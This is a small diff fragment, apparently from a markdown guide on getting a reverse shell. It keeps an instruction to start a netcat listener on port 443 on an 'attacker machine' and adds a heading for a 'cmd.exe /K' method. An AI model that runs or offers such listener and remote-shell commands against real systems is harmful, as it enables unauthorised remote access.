@@ -25,3 +25,5 @@ On the Attacker Machine (Kali/Linux), start a listener:
 ```
 nc -lvnp 443
 ```
+
+### ✅ 2. cmd.exe /K
